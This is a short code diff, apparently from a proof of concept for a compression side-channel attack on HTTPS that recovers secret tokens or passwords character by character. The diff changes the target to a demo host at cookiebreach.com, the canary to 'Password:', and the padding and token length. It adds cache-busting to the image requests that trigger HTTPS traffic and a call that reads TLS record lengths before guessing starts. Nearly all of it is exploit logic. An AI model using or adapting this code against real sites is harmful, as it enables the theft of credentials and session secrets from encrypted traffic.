@@ -1,11 +1,11 @@
 //bb63e4ba67e24dab81ed425c5a95b7a2
-var baseURL = "https://cookebreach.com/poc.php";
-var canary = "request_token='";
-var paddingCount = 40;
+var baseURL = "https://demo.cookiebreach.com/poc.php";
+var canary = "Password:";
+var paddingCount = 10;
 var paddingBlock = '{}';
 var endingBlock = '@';
 var knownToken = '';
-var tokenLength = 27;
+var tokenLength = 10;
 var guessCharIndex = 0;
 var guessRound = 0;
 var reflectedCookieName = 'nickname';
@@ -108,7 +108,7 @@ function triggerHttps() {
     } else {
         forceCookie(canary + knownToken + padding + guessChar + endingBlock);
     }
-    img.src = baseURL;
+    img.src = baseURL + '?' + new Date().getTime();
 }
 function getLastTlsLength() {
     var lastLegnth = 0;
@@ -133,6 +133,7 @@ function initTokenAlphabet() {
     }
 }
 function startBreach() {
+    getLastTlsLength();
     initTokenAlphabet();
     guessRound = 0;
     guessCharIndex = 0;
